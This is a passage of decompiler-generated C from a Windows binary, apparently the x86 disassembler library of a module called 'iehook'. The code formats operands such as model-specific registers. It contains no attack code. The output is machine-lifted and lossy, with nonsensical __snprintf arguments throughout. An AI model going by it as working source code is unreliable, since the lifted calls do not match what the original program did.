                                    *(char *)(v19 + (int32_t)v563) = 123;
                                    *v18 = *v18 + 1;
                                    int32_t * v564 = (int32_t *)v79; // 0x10003dc6
                                    int32_t v565 = *v564; // 0x10003dc6
                                    int32_t v566 = v565; // 0x10003dcc
                                    if ((v565 & 0xe000) == 0) {
                                        // 0x10003dce
                                        *v559 = 2671;
                                        *v560 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                        *v561 = (int32_t)L"Operand->Flags & (OP_EXEC|OP_SRC|OP_DST)";
                                        __wassert();
                                        v566 = *v564;
                                    }
                                    int32_t v567 = v566; // 0x10003deb
                                    if ((v566 & 0x200000) != 0) {
                                        // 0x10003ded
                                        *(char *)(v19 + (int32_t)*v18) = 114;
                                        *v18 = *v18 + 1;
                                        v567 = *v564;
                                    }
                                    int32_t v568 = v567; // 0x10003e05
                                    if ((v567 & 0x100000) != 0) {
                                        // 0x10003e07
                                        *(char *)(v19 + (int32_t)*v18) = 102;
                                        *v18 = *v18 + 1;
                                        v568 = *v564;
                                    }
                                    int32_t v569 = v568; // 0x10003e1f
                                    if ((v568 & 1024) != 0) {
                                        // 0x10003e21
                                        *(char *)(v19 + (int32_t)*v18) = 99;
                                        *v18 = *v18 + 1;
                                        v569 = *v564;
                                    }
                                    // 0x10003e33
                                    v72 = v69;
                                    v61 = v569;
                                    v65 = v63;
                                    if ((int16_t)v569 > -1) {
                                        goto lab_0x1000ae34;
                                    } else {
                                        // 0x10003e40
                                        *(char *)(v19 + (int32_t)*v18) = 88;
                                        v73 = v69;
                                        v66 = v63;
                                        goto lab_0x1000ae47;
                                    }
                                }
                            }
                        }
                    }
                    case 68: {
                        // 0x100041a2
                        v74 = v69;
                        v67 = v63;
                        if ((a3 & 4) == 0) {
                            goto lab_0x1000af15;
                        } else {
                            // 0x100041ac
                            *(int16_t *)(v79 + 6) = 8;
                            char * v570 = (char *)(v79 + 4); // 0x100041b5
                            *v570 = *v570 & -64 | 6;
                            v74 = v69;
                            v67 = v63;
                            if ((a3 & 2) == 0) {
                                goto lab_0x1000af15;
                            } else {
                                unsigned char v571 = *v18; // 0x100041cb
                                int32_t v572 = v571; // 0x100041cb
                                int32_t * v573 = (int32_t *)(v63 - 4); // 0x100041e4
                                *v573 = (int32_t)"<FMASK_MSR>";
                                int32_t * v574 = (int32_t *)(v63 - 8); // 0x100041e9
                                *v574 = v571 == -1 ? 0 : 256 - v572;
                                int32_t * v575 = (int32_t *)(v63 - 12); // 0x100041f1
                                *v575 = v19 + v572;
                                int32_t v576 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x100041f2
                                unsigned char v577 = *v18 + (char)v576; // 0x100041f7
                                *v18 = v577;
                                v74 = v69;
                                v67 = v63;
                                if ((a3 & 16) == 0) {
                                    goto lab_0x1000af15;
                                } else {
                                    // 0x10004210
                                    *(char *)(v19 + (int32_t)v577) = 123;
                                    *v18 = *v18 + 1;
                                    int32_t * v578 = (int32_t *)v79; // 0x1000421e
                                    int32_t v579 = *v578; // 0x1000421e
                                    int32_t v580 = v579; // 0x10004224
                                    if ((v579 & 0xe000) == 0) {
                                        // 0x10004226
                                        *v573 = 2718;
                                        *v574 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                        *v575 = (int32_t)L"Operand->Flags & (OP_EXEC|OP_SRC|OP_DST)";
                                        __wassert();
                                        v580 = *v578;
                                    }
                                    int32_t v581 = v580; // 0x10004243
                                    if ((v580 & 0x200000) != 0) {
                                        // 0x10004245
                                        *(char *)(v19 + (int32_t)*v18) = 114;
                                        *v18 = *v18 + 1;
                                        v581 = *v578;
                                    }
                                    int32_t v582 = v581; // 0x1000425d
                                    if ((v581 & 0x100000) != 0) {
                                        // 0x1000425f
                                        *(char *)(v19 + (int32_t)*v18) = 102;
                                        *v18 = *v18 + 1;
                                        v582 = *v578;
                                    }
                                    int32_t v583 = v582; // 0x10004277
                                    if ((v582 & 1024) != 0) {
                                        // 0x10004279
                                        *(char *)(v19 + (int32_t)*v18) = 99;
                                        *v18 = *v18 + 1;
                                        v583 = *v578;
                                    }
                                    // 0x1000428b
                                    v72 = v69;
                                    v61 = v583;
                                    v65 = v63;
                                    if ((int16_t)v583 > -1) {
                                        goto lab_0x1000ae34;
                                    } else {
                                        // 0x10004298
                                        *(char *)(v19 + (int32_t)*v18) = 88;
                                        v73 = v69;
                                        v66 = v63;
                                        goto lab_0x1000ae47;
                                    }
                                }
                            }
                        }
                    }
                    case 69: {
                        // 0x10003e51
                        v74 = v69;
                        v67 = v63;
                        if ((a3 & 4) == 0) {
                            goto lab_0x1000af15;
                        } else {
                            // 0x10003e5b
                            *(int16_t *)(v79 + 6) = 8;
                            char * v584 = (char *)(v79 + 4); // 0x10003e64
                            *v584 = *v584 & -64 | 6;
                            v74 = v69;
                            v67 = v63;
                            if ((a3 & 2) == 0) {
                                goto lab_0x1000af15;
                            } else {
                                unsigned char v585 = *v18; // 0x10003e7a
                                int32_t v586 = v585; // 0x10003e7a
                                int32_t * v587 = (int32_t *)(v63 - 4); // 0x10003e93
                                *v587 = (int32_t)"<STAR_MSR>";
                                int32_t * v588 = (int32_t *)(v63 - 8); // 0x10003e98
                                *v588 = v585 == -1 ? 0 : 256 - v586;
                                int32_t * v589 = (int32_t *)(v63 - 12); // 0x10003ea0
                                *v589 = v19 + v586;
                                int32_t v590 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x10003ea1
                                unsigned char v591 = *v18 + (char)v590; // 0x10003ea6
                                *v18 = v591;
                                v74 = v69;
                                v67 = v63;
                                if ((a3 & 16) == 0) {
                                    goto lab_0x1000af15;
                                } else {
                                    // 0x10003ebf
                                    *(char *)(v19 + (int32_t)v591) = 123;
                                    *v18 = *v18 + 1;
                                    int32_t * v592 = (int32_t *)v79; // 0x10003ecd
                                    int32_t v593 = *v592; // 0x10003ecd
                                    int32_t v594 = v593; // 0x10003ed3
                                    if ((v593 & 0xe000) == 0) {
                                        // 0x10003ed5
                                        *v587 = 2683;
                                        *v588 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                        *v589 = (int32_t)L"Operand->Flags & (OP_EXEC|OP_SRC|OP_DST)";
                                        __wassert();
                                        v594 = *v592;
                                    }
                                    int32_t v595 = v594; // 0x10003ef2
                                    if ((v594 & 0x200000) != 0) {
                                        // 0x10003ef4
                                        *(char *)(v19 + (int32_t)*v18) = 114;
                                        *v18 = *v18 + 1;
                                        v595 = *v592;
                                    }
                                    int32_t v596 = v595; // 0x10003f0c
                                    if ((v595 & 0x100000) != 0) {
                                        // 0x10003f0e
                                        *(char *)(v19 + (int32_t)*v18) = 102;
                                        *v18 = *v18 + 1;
                                        v596 = *v592;
                                    }
                                    int32_t v597 = v596; // 0x10003f26
                                    if ((v596 & 1024) != 0) {
                                        // 0x10003f28
                                        *(char *)(v19 + (int32_t)*v18) = 99;
                                        *v18 = *v18 + 1;
                                        v597 = *v592;
                                    }
                                    // 0x10003f3a
                                    v72 = v69;
                                    v61 = v597;
                                    v65 = v63;
                                    if ((int16_t)v597 > -1) {
                                        goto lab_0x1000ae34;
                                    } else {
                                        // 0x10003f47
                                        *(char *)(v19 + (int32_t)*v18) = 88;
                                        v73 = v69;
                                        v66 = v63;
                                        goto lab_0x1000ae47;
                                    }
                                }
                            }
                        }
                    }
                    case 70: {
                        // 0x10003f58
                        if (*(int32_t *)(*v27 + 4) == 3) {
                            // 0x10003f61
                            *(int32_t *)(v63 - 4) = 2687;
                            *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                            *(int32_t *)(v63 - 12) = (int32_t)L"!IS_AMD64()";
                            __wassert();
                        }
                        // 0x10003f78
                        v74 = v69;
                        v67 = v63;
                        if ((a3 & 4) == 0) {
                            goto lab_0x1000af15;
                        } else {
                            // 0x10003f82
                            *(int16_t *)(v79 + 6) = 8;
                            char * v598 = (char *)(v79 + 4); // 0x10003f8b
                            *v598 = *v598 & -64 | 6;
                            v74 = v69;
                            v67 = v63;
                            if ((a3 & 2) == 0) {
                                goto lab_0x1000af15;
                            } else {
                                unsigned char v599 = *v18; // 0x10003f9f
                                int32_t v600 = v599; // 0x10003f9f
                                int32_t * v601 = (int32_t *)(v63 - 4); // 0x10003fb8
                                *v601 = (int32_t)"<CSTAR_MSR>";
                                int32_t * v602 = (int32_t *)(v63 - 8); // 0x10003fbd
                                *v602 = v599 == -1 ? 0 : 256 - v600;
                                int32_t * v603 = (int32_t *)(v63 - 12); // 0x10003fc5
                                *v603 = v19 + v600;
                                int32_t v604 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x10003fc6
                                unsigned char v605 = *v18 + (char)v604; // 0x10003fcb
                                *v18 = v605;
                                v74 = v69;
                                v67 = v63;
                                if ((a3 & 16) == 0) {
                                    goto lab_0x1000af15;
                                } else {
                                    // 0x10003fe4
                                    *(char *)(v19 + (int32_t)v605) = 123;
                                    *v18 = *v18 + 1;
                                    int32_t * v606 = (int32_t *)v79; // 0x10003ff2
                                    int32_t v607 = *v606; // 0x10003ff2
                                    int32_t v608 = v607; // 0x10003ff8
                                    if ((v607 & 0xe000) == 0) {
                                        // 0x10003ffa
                                        *v601 = 2695;
                                        *v602 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                        *v603 = (int32_t)L"Operand->Flags & (OP_EXEC|OP_SRC|OP_DST)";
                                        __wassert();
                                        v608 = *v606;
                                    }
                                    int32_t v609 = v608; // 0x10004017
                                    if ((v608 & 0x200000) != 0) {
                                        // 0x10004019
                                        *(char *)(v19 + (int32_t)*v18) = 114;
                                        *v18 = *v18 + 1;
                                        v609 = *v606;
                                    }
                                    int32_t v610 = v609; // 0x10004031
                                    if ((v609 & 0x100000) != 0) {
                                        // 0x10004033
                                        *(char *)(v19 + (int32_t)*v18) = 102;
                                        *v18 = *v18 + 1;
                                        v610 = *v606;
                                    }
                                    int32_t v611 = v610; // 0x1000404b
                                    if ((v610 & 1024) != 0) {
                                        // 0x1000404d
                                        *(char *)(v19 + (int32_t)*v18) = 99;
                                        *v18 = *v18 + 1;
                                        v611 = *v606;
                                    }
                                    // 0x1000405f
                                    v72 = v69;
                                    v61 = v611;
                                    v65 = v63;
                                    if ((int16_t)v611 > -1) {
                                        goto lab_0x1000ae34;
                                    } else {
                                        // 0x1000406c
                                        *(char *)(v19 + (int32_t)*v18) = 88;
                                        v73 = v69;
                                        v66 = v63;
                                        goto lab_0x1000ae47;
                                    }
                                }
                            }
                        }
                    }
                    case 71: {
                        // 0x1000407d
                        if (*(int32_t *)(*v27 + 4) != 3) {
                            // 0x10004086
                            *(int32_t *)(v63 - 4) = 2699;
                            *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                            *(int32_t *)(v63 - 12) = (int32_t)L"IS_AMD64()";
                            __wassert();
                        }
                        // 0x1000409d
                        v74 = v69;
                        v67 = v63;
                        if ((a3 & 4) == 0) {
                            goto lab_0x1000af15;
                        } else {
                            // 0x100040a7
                            *(int16_t *)(v79 + 6) = 8;
                            char * v612 = (char *)(v79 + 4); // 0x100040b0
                            *v612 = *v612 & -64 | 6;
                            v74 = v69;
                            v67 = v63;
                            if ((a3 & 2) == 0) {
                                goto lab_0x1000af15;
                            } else {
                                unsigned char v613 = *v18; // 0x100040c4
                                int32_t v614 = v613; // 0x100040c4
                                int32_t * v615 = (int32_t *)(v63 - 4); // 0x100040dd
                                *v615 = (int32_t)"<LSTAR_MSR>";
                                int32_t * v616 = (int32_t *)(v63 - 8); // 0x100040e2
                                *v616 = v613 == -1 ? 0 : 256 - v614;
                                int32_t * v617 = (int32_t *)(v63 - 12); // 0x100040ea
                                *v617 = v19 + v614;
                                int32_t v618 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x100040eb
                                unsigned char v619 = *v18 + (char)v618; // 0x100040f0
                                *v18 = v619;
                                v74 = v69;
                                v67 = v63;
                                if ((a3 & 16) == 0) {
                                    goto lab_0x1000af15;
                                } else {
                                    // 0x10004109
                                    *(char *)(v19 + (int32_t)v619) = 123;
                                    *v18 = *v18 + 1;
                                    int32_t * v620 = (int32_t *)v79; // 0x10004117
                                    int32_t v621 = *v620; // 0x10004117
                                    int32_t v622 = v621; // 0x1000411d
                                    if ((v621 & 0xe000) == 0) {
                                        // 0x1000411f
                                        *v615 = 2707;
                                        *v616 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                        *v617 = (int32_t)L"Operand->Flags & (OP_EXEC|OP_SRC|OP_DST)";
                                        __wassert();
                                        v622 = *v620;
                                    }
                                    int32_t v623 = v622; // 0x1000413c
                                    if ((v622 & 0x200000) != 0) {
                                        // 0x1000413e
                                        *(char *)(v19 + (int32_t)*v18) = 114;
                                        *v18 = *v18 + 1;
                                        v623 = *v620;
                                    }
                                    int32_t v624 = v623; // 0x10004156
                                    if ((v623 & 0x100000) != 0) {
                                        // 0x10004158
                                        *(char *)(v19 + (int32_t)*v18) = 102;
                                        *v18 = *v18 + 1;
                                        v624 = *v620;
                                    }
                                    int32_t v625 = v624; // 0x10004170
                                    if ((v624 & 1024) != 0) {
                                        // 0x10004172
                                        *(char *)(v19 + (int32_t)*v18) = 99;
                                        *v18 = *v18 + 1;
                                        v625 = *v620;
                                    }
                                    // 0x10004184
                                    v72 = v69;
                                    v61 = v625;
                                    v65 = v63;
                                    if ((int16_t)v625 > -1) {
                                        goto lab_0x1000ae34;
                                    } else {
                                        // 0x10004191
                                        *(char *)(v19 + (int32_t)*v18) = 88;
                                        v73 = v69;
                                        v66 = v63;
                                        goto lab_0x1000ae47;
                                    }
                                }
                            }
                        }
                    }
                    case 128: {
                        // 0x100042a9
                        v74 = v69;
                        v67 = v63;
                        if ((a3 & 4) == 0) {
                            goto lab_0x1000af15;
                        } else {
                            // 0x100042b3
                            v76 = (int16_t *)(v79 + 6);
                            *v76 = (int16_t)(*v26 & 15);
                            v77 = 8 * *v31 & 8 | v32;
                            int32_t v626 = v77; // 0x100042d7
                            int32_t v627 = (int32_t)(*v26 & 15); // 0x100042e0
                            g163 = v627 - 1;
                            switch (v627) {
                                case 1: {
                                    int32_t v628 = v626 | 112; // 0x10004324
                                    *(int32_t *)(v79 + 16) = v628;
                                    v62 = v628;
                                    if (*v31 == 0) {
                                        goto lab_0x10004342;
                                    } else {
                                        goto lab_0x1000433a;
                                    }
                                }
                                case 2: {
                                    int32_t v629 = v626 | 128; // 0x10004312
                                    *(int32_t *)(v79 + 16) = v629;
                                    v62 = v629;
                                    goto lab_0x1000433a;
                                }
                                case 4: {
                                    int32_t v630 = v626 | 144; // 0x10004305
                                    *(int32_t *)(v79 + 16) = v630;
                                    v62 = v630;
                                    goto lab_0x1000433a;
                                }
                                case 8: {
                                    // 0x100042f4
                                    *(int32_t *)(v79 + 16) = v626 | 208;
                                    goto lab_0x10004342;
                                }
                                default: {
                                    // 0x1000af31
                                    *(int32_t *)(v63 - 4) = 2745;
                                    *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                    *(int32_t *)(v63 - 12) = (int32_t)&g3;
                                    __wassert();
                                    // 0x1000af28
                                    return 0;
                                }
                            }
                        }
                    }
                    case 129: {
                        // 0x10004748
                        v74 = v69;
                        v67 = v63;
                        if ((a3 & 4) == 0) {
                            goto lab_0x1000af15;
                        } else {
                            // 0x10004752
                            *(int16_t *)(v79 + 6) = 1;
                            int32_t * v631 = (int32_t *)(v79 + 16); // 0x1000475b
                            *v631 = 112;
                            int32_t * v632 = (int32_t *)v79; // 0x10004762
                            if ((*v632 & 0x4000) != 0) {
                                // 0x1000476a
                                *(char *)(v30 + (int32_t)(*v29 / 16 & 3)) = v75;
                                char v633 = *v29; // 0x1000477e
                                *v29 = v633 + 16 & 48 | v633 & -49;
                                if (v75 >= 2) {
                                    // 0x1000479e
                                    *(int32_t *)(v63 - 4) = 2779;
                                    *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                    *(int32_t *)(v63 - 12) = (int32_t)L"OperandIndex < 2";
                                    __wassert();
                                }
                            }
                            // 0x100047b8
                            if ((*v632 & 0x2000) != 0) {
                                // 0x100047c0
                                *(char *)(((int32_t)(*v29 / 64) | 756) + v1) = v75;
                                *v29 = *v29 + 64;
                            }
                            // 0x100047e9
                            v74 = v69;
                            v67 = v63;
                            if ((a3 & 2) == 0) {
                                goto lab_0x1000af15;
                            } else {
                                unsigned char v634 = *v18; // 0x100047f3
                                int32_t v635 = v634; // 0x100047f3
                                int32_t * v636 = (int32_t *)(v63 - 4); // 0x10004816
                                *v636 = *(int32_t *)(4 * *v631 + (int32_t)&g68);
                                int32_t * v637 = (int32_t *)(v63 - 8); // 0x10004817
                                *v637 = (int32_t)"<%s>";
                                int32_t * v638 = (int32_t *)(v63 - 12); // 0x1000481c
                                *v638 = v634 == -1 ? 0 : 256 - v635;
                                *(int32_t *)(v63 - 16) = v19 + v635;
                                int32_t v639 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x10004825
                                unsigned char v640 = *v18 + (char)v639; // 0x1000482a
                                *v18 = v640;
                                v74 = v69;
                                v67 = v63;
                                if ((a3 & 16) == 0) {
                                    goto lab_0x1000af15;
                                } else {
                                    // 0x10004843
                                    *(char *)(v19 + (int32_t)v640) = 123;
                                    *v18 = *v18 + 1;
                                    int32_t v641 = *v632; // 0x10004851
                                    int32_t v642 = v641; // 0x10004857
                                    if ((v641 & 0xe000) == 0) {
                                        // 0x10004859
                                        *v636 = 2784;
                                        *v637 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                        *v638 = (int32_t)L"Operand->Flags & (OP_EXEC|OP_SRC|OP_DST)";
                                        __wassert();
                                        v642 = *v632;
                                    }
                                    int32_t v643 = v642; // 0x10004876
                                    if ((v642 & 0x200000) != 0) {
                                        // 0x10004878
                                        *(char *)(v19 + (int32_t)*v18) = 114;
                                        *v18 = *v18 + 1;
                                        v643 = *v632;
                                    }
                                    int32_t v644 = v643; // 0x10004890
                                    if ((v643 & 0x100000) != 0) {
                                        // 0x10004892
                                        *(char *)(v19 + (int32_t)*v18) = 102;
                                        *v18 = *v18 + 1;
                                        v644 = *v632;
                                    }
                                    int32_t v645 = v644; // 0x100048aa
                                    if ((v644 & 1024) != 0) {
                                        // 0x100048ac
                                        *(char *)(v19 + (int32_t)*v18) = 99;
                                        *v18 = *v18 + 1;
                                        v645 = *v632;
                                    }
                                    // 0x100048be
                                    v72 = v69;
                                    v61 = v645;
                                    v65 = v63;
                                    if ((int16_t)v645 > -1) {
                                        goto lab_0x1000ae34;
                                    } else {
                                        // 0x100048cb
                                        *(char *)(v19 + (int32_t)*v18) = 88;
                                        v73 = v69;
                                        v66 = v63;
                                        goto lab_0x1000ae47;
                                    }
                                }
                            }
                        }
                    }
                    case 130: {
                        // 0x100048dc
                        v74 = v69;
                        v67 = v63;
                        if ((a3 & 4) == 0) {
                            goto lab_0x1000af15;
                        } else {
                            // 0x100048e6
                            *(int16_t *)(v79 + 6) = 1;
                            int32_t * v646 = (int32_t *)(v79 + 16); // 0x100048ef
                            *v646 = 113;
                            int32_t * v647 = (int32_t *)v79; // 0x100048f6
                            if ((*v647 & 0x4000) != 0) {
                                // 0x100048fe
                                *(char *)(v30 + (int32_t)(*v29 / 16 & 3)) = v75;
                                char v648 = *v29; // 0x10004912
                                *v29 = v648 + 16 & 48 | v648 & -49;
                                if (v75 >= 2) {
                                    // 0x10004932
                                    *(int32_t *)(v63 - 4) = 2791;
                                    *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                    *(int32_t *)(v63 - 12) = (int32_t)L"OperandIndex < 2";
                                    __wassert();
                                }
                            }
                            // 0x1000494c
                            if ((*v647 & 0x2000) != 0) {
                                // 0x10004954
                                *(char *)(((int32_t)(*v29 / 64) | 756) + v1) = v75;
                                *v29 = *v29 + 64;
                            }
                            // 0x1000497d
                            v74 = v69;
                            v67 = v63;
                            if ((a3 & 2) == 0) {
                                goto lab_0x1000af15;
                            } else {
                                unsigned char v649 = *v18; // 0x10004987
                                int32_t v650 = v649; // 0x10004987
                                int32_t * v651 = (int32_t *)(v63 - 4); // 0x100049aa
                                *v651 = *(int32_t *)(4 * *v646 + (int32_t)&g68);
                                int32_t * v652 = (int32_t *)(v63 - 8); // 0x100049ab
                                *v652 = (int32_t)"<%s>";
                                int32_t * v653 = (int32_t *)(v63 - 12); // 0x100049b0
                                *v653 = v649 == -1 ? 0 : 256 - v650;
                                *(int32_t *)(v63 - 16) = v19 + v650;
                                int32_t v654 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x100049b9
                                unsigned char v655 = *v18 + (char)v654; // 0x100049be
                                *v18 = v655;
                                v74 = v69;
                                v67 = v63;
                                if ((a3 & 16) == 0) {
                                    goto lab_0x1000af15;
                                } else {
                                    // 0x100049d7
                                    *(char *)(v19 + (int32_t)v655) = 123;
                                    *v18 = *v18 + 1;
                                    int32_t v656 = *v647; // 0x100049e5
                                    int32_t v657 = v656; // 0x100049eb
                                    if ((v656 & 0xe000) == 0) {
                                        // 0x100049ed
                                        *v651 = 2796;
                                        *v652 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                        *v653 = (int32_t)L"Operand->Flags & (OP_EXEC|OP_SRC|OP_DST)";
                                        __wassert();
                                        v657 = *v647;
                                    }
                                    int32_t v658 = v657; // 0x10004a0a
                                    if ((v657 & 0x200000) != 0) {
                                        // 0x10004a0c
                                        *(char *)(v19 + (int32_t)*v18) = 114;
                                        *v18 = *v18 + 1;
                                        v658 = *v647;
                                    }
                                    int32_t v659 = v658; // 0x10004a24
                                    if ((v658 & 0x100000) != 0) {
                                        // 0x10004a26
                                        *(char *)(v19 + (int32_t)*v18) = 102;
                                        *v18 = *v18 + 1;
                                        v659 = *v647;
                                    }
                                    int32_t v660 = v659; // 0x10004a3e
                                    if ((v659 & 1024) != 0) {
                                        // 0x10004a40
                                        *(char *)(v19 + (int32_t)*v18) = 99;
                                        *v18 = *v18 + 1;
                                        v660 = *v647;
                                    }
                                    // 0x10004a52
                                    v72 = v69;
                                    v61 = v660;
                                    v65 = v63;
                                    if ((int16_t)v660 > -1) {
                                        goto lab_0x1000ae34;
                                    } else {
                                        // 0x10004a5f
                                        *(char *)(v19 + (int32_t)*v18) = 88;
                                        v73 = v69;
                                        v66 = v63;
                                        goto lab_0x1000ae47;
                                    }
                                }
                            }
                        }
                    }
                    case 131: {
                        // 0x10004a70
                        v74 = v69;
                        v67 = v63;
                        if ((a3 & 4) == 0) {
                            goto lab_0x1000af15;
                        } else {
                            // 0x10004a7a
                            *(int16_t *)(v79 + 6) = 1;
                            int32_t * v661 = (int32_t *)(v79 + 16); // 0x10004a83
                            *v661 = 116;
                            int32_t * v662 = (int32_t *)v79; // 0x10004a8a
                            if ((*v662 & 0x4000) != 0) {
                                // 0x10004a92
                                *(char *)(v30 + (int32_t)(*v29 / 16 & 3)) = v75;
                                char v663 = *v29; // 0x10004aa6
                                *v29 = v663 + 16 & 48 | v663 & -49;
                                if (v75 >= 2) {
                                    // 0x10004ac6
                                    *(int32_t *)(v63 - 4) = 2803;
                                    *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                    *(int32_t *)(v63 - 12) = (int32_t)L"OperandIndex < 2";
                                    __wassert();
                                }
                            }
                            // 0x10004ae0
                            if ((*v662 & 0x2000) != 0) {
                                // 0x10004ae8
                                *(char *)(((int32_t)(*v29 / 64) | 756) + v1) = v75;
                                *v29 = *v29 + 64;
                            }
                            // 0x10004b11
                            v74 = v69;
                            v67 = v63;
                            if ((a3 & 2) == 0) {
                                goto lab_0x1000af15;
                            } else {
                                unsigned char v664 = *v18; // 0x10004b1b
                                int32_t v665 = v664; // 0x10004b1b
                                int32_t * v666 = (int32_t *)(v63 - 4); // 0x10004b3e
                                *v666 = *(int32_t *)(4 * *v661 + (int32_t)&g68);
                                int32_t * v667 = (int32_t *)(v63 - 8); // 0x10004b3f
                                *v667 = (int32_t)"<%s>";
                                int32_t * v668 = (int32_t *)(v63 - 12); // 0x10004b44
                                *v668 = v664 == -1 ? 0 : 256 - v665;
                                *(int32_t *)(v63 - 16) = v19 + v665;
                                int32_t v669 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x10004b4d
                                unsigned char v670 = *v18 + (char)v669; // 0x10004b52
                                *v18 = v670;
                                v74 = v69;
                                v67 = v63;
                                if ((a3 & 16) == 0) {
                                    goto lab_0x1000af15;
                                } else {
                                    // 0x10004b6b
                                    *(char *)(v19 + (int32_t)v670) = 123;
                                    *v18 = *v18 + 1;
                                    int32_t v671 = *v662; // 0x10004b79
                                    int32_t v672 = v671; // 0x10004b7f
                                    if ((v671 & 0xe000) == 0) {
                                        // 0x10004b81
                                        *v666 = 2808;
                                        *v667 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                        *v668 = (int32_t)L"Operand->Flags & (OP_EXEC|OP_SRC|OP_DST)";
                                        __wassert();
                                        v672 = *v662;
                                    }
                                    int32_t v673 = v672; // 0x10004b9e
                                    if ((v672 & 0x200000) != 0) {
                                        // 0x10004ba0
                                        *(char *)(v19 + (int32_t)*v18) = 114;
                                        *v18 = *v18 + 1;
                                        v673 = *v662;
                                    }
                                    int32_t v674 = v673; // 0x10004bb8
                                    if ((v673 & 0x100000) != 0) {
                                        // 0x10004bba
                                        *(char *)(v19 + (int32_t)*v18) = 102;
                                        *v18 = *v18 + 1;
                                        v674 = *v662;
                                    }
                                    int32_t v675 = v674; // 0x10004bd2
                                    if ((v674 & 1024) != 0) {
                                        // 0x10004bd4
                                        *(char *)(v19 + (int32_t)*v18) = 99;
                                        *v18 = *v18 + 1;
                                        v675 = *v662;
                                    }
                                    // 0x10004be6
                                    v72 = v69;
                                    v61 = v675;
                                    v65 = v63;
                                    if ((int16_t)v675 > -1) {
                                        goto lab_0x1000ae34;
                                    } else {
                                        // 0x10004bf3
                                        *(char *)(v19 + (int32_t)*v18) = 88;
                                        v73 = v69;
                                        v66 = v63;
                                        goto lab_0x1000ae47;
                                    }
                                }
                            }
                        }
                    }
                    case 132: {
                        // 0x10004c04
                        v74 = v69;
                        v67 = v63;
                        if ((a3 & 4) == 0) {
                            goto lab_0x1000af15;
                        } else {
                            // 0x10004c0e
                            *(int16_t *)(v79 + 6) = 2;
                            int32_t * v676 = (int32_t *)(v79 + 16); // 0x10004c17
                            *v676 = 128;
                            int32_t * v677 = (int32_t *)v79; // 0x10004c1e
                            if ((*v677 & 0x4000) != 0) {
                                // 0x10004c26
                                *(char *)(v30 + (int32_t)(*v29 / 16 & 3)) = v75;
                                char v678 = *v29; // 0x10004c3a
                                *v29 = v678 + 16 & 48 | v678 & -49;
                                if (v75 >= 2) {
                                    // 0x10004c5a
                                    *(int32_t *)(v63 - 4) = 2815;
                                    *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                    *(int32_t *)(v63 - 12) = (int32_t)L"OperandIndex < 2";
                                    __wassert();
                                }
                            }
                            // 0x10004c74
                            if ((*v677 & 0x2000) != 0) {
                                // 0x10004c7c
                                *(char *)(((int32_t)(*v29 / 64) | 756) + v1) = v75;
                                *v29 = *v29 + 64;
                            }
                            // 0x10004ca5
                            v74 = v69;
                            v67 = v63;
                            if ((a3 & 2) == 0) {
                                goto lab_0x1000af15;
                            } else {
                                unsigned char v679 = *v18; // 0x10004caf
                                int32_t v680 = v679; // 0x10004caf
                                int32_t * v681 = (int32_t *)(v63 - 4); // 0x10004cd2
                                *v681 = *(int32_t *)(4 * *v676 + (int32_t)&g68);
                                int32_t * v682 = (int32_t *)(v63 - 8); // 0x10004cd3
                                *v682 = (int32_t)"<%s>";
                                int32_t * v683 = (int32_t *)(v63 - 12); // 0x10004cd8
                                *v683 = v679 == -1 ? 0 : 256 - v680;
                                *(int32_t *)(v63 - 16) = v19 + v680;
                                int32_t v684 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x10004ce1
                                unsigned char v685 = *v18 + (char)v684; // 0x10004ce6
                                *v18 = v685;
                                v74 = v69;
                                v67 = v63;
                                if ((a3 & 16) == 0) {
                                    goto lab_0x1000af15;
                                } else {
                                    // 0x10004cff
                                    *(char *)(v19 + (int32_t)v685) = 123;
                                    *v18 = *v18 + 1;
                                    int32_t v686 = *v677; // 0x10004d0d
                                    int32_t v687 = v686; // 0x10004d13
                                    if ((v686 & 0xe000) == 0) {
                                        // 0x10004d15
                                        *v681 = 2820;
                                        *v682 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                        *v683 = (int32_t)L"Operand->Flags & (OP_EXEC|OP_SRC|OP_DST)";
                                        __wassert();
                                        v687 = *v677;
                                    }
                                    int32_t v688 = v687; // 0x10004d32
                                    if ((v687 & 0x200000) != 0) {
                                        // 0x10004d34
                                        *(char *)(v19 + (int32_t)*v18) = 114;
                                        *v18 = *v18 + 1;
                                        v688 = *v677;
                                    }
                                    int32_t v689 = v688; // 0x10004d4c
                                    if ((v688 & 0x100000) != 0) {
                                        // 0x10004d4e
                                        *(char *)(v19 + (int32_t)*v18) = 102;
                                        *v18 = *v18 + 1;
                                        v689 = *v677;
                                    }
                                    int32_t v690 = v689; // 0x10004d66
                                    if ((v689 & 1024) != 0) {
                                        // 0x10004d68
